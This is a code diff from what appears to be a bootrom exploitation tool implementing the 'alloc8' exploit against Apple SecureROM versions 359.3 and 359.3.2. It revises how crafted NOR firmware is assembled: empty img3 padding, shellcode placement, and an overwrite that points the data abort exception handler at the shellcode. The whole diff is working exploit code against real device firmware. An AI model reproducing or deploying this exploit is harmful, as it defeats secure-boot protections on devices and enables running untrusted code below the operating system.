@@ -97,7 +97,7 @@ configs = [
 
 alloc8_constants_359_3 = [
     0x84034000, #  1 - MAIN_STACK_ADDRESS
-        0x5604, #  2 - handle_data_abort
+         0x544, #  2 - clean_invalidate_data_cache
     0x84024020, #  3 - gNorImg3List
         0x1ccd, #  4 - free
         0x3ca1, #  5 - exit_critical_section
@@ -125,7 +125,7 @@ alloc8_constants_359_3 = [
 
 alloc8_constants_359_3_2 = [
     0x84034000, #  1 - MAIN_STACK_ADDRESS
-        0x560c, #  2 - handle_data_abort
+         0x544, #  2 - clean_invalidate_data_cache
     0x84024020, #  3 - gNorImg3List
         0x1ccd, #  4 - free
         0x3ca9, #  5 - exit_critical_section
@@ -309,7 +309,7 @@ class PwnedDFUDevice():
         assert len(nor) == len(new_nor)
         return new_nor
 
-    def add_alloc8_exploit_to_nor(self, nor, securerom):
+    def add_alloc8_exploit_to_nor(self, nor):
         SHELLCODE_ADDRESS = 0x84026214 + 1
         MAX_SHELLCODE_LENGTH = 460
         REQUIRED_IMG3_COUNT = 714
@@ -330,8 +330,10 @@ class PwnedDFUDevice():
 
         if self.config.version == '359.3':
             constants = alloc8_constants_359_3
+            exceptions = [0x5620, 0x5630]
         elif self.config.version == '359.3.2':
             constants = alloc8_constants_359_3_2
+            exceptions = [0x5628, 0x5638]
         else:
             print 'ERROR: SecureROM %s is not supported by alloc8.' % self.config.version
             sys.exit(1)
@@ -363,22 +365,19 @@ class PwnedDFUDevice():
             offset += img3_header[1]
             count += 1
 
-        # Add REQUIRED_IMG3_COUNT - count - 1 empty img3s
+        # Add REQUIRED_IMG3_COUNT - count - 1 empty img3s.
         for i in range(REQUIRED_IMG3_COUNT - count - 1):
             new_nor_firmware += empty_img3_data(block_size)
 
-        # Final img3 must end at the end of the block.
+        # Final img3 must end at the end of the block, followed by SecureROM overwrite data.
+        # SHELLCODE_ADDRESS overrides the data abort exception handler.
         final_offset = firmware_offset + len(new_nor_firmware)
         final_size = NOR_READ_SIZE - final_offset % NOR_READ_SIZE
         if final_size < 20:
             final_size += NOR_READ_SIZE
         assert final_size % block_size == 0
 
-        new_nor_firmware += empty_img3_data(final_size)
-
-        # Only override data abort handler, keep the rest
-        securerom_block = securerom[8:8+NOR_READ_SIZE]
-        new_nor_firmware += securerom_block[:40] + struct.pack('<I', SHELLCODE_ADDRESS) + securerom_block[44:]
+        new_nor_firmware += empty_img3_data(final_size) + '\x00' * 0x28 + struct.pack('<4I', SHELLCODE_ADDRESS, 0, *exceptions)
         new_nor_firmware += '\xff' * (len(nor_firmware) - len(new_nor_firmware))
 
         new_nor = nor[0:52] + shellcode + '\x00' * (MAX_SHELLCODE_LENGTH - len(shellcode))
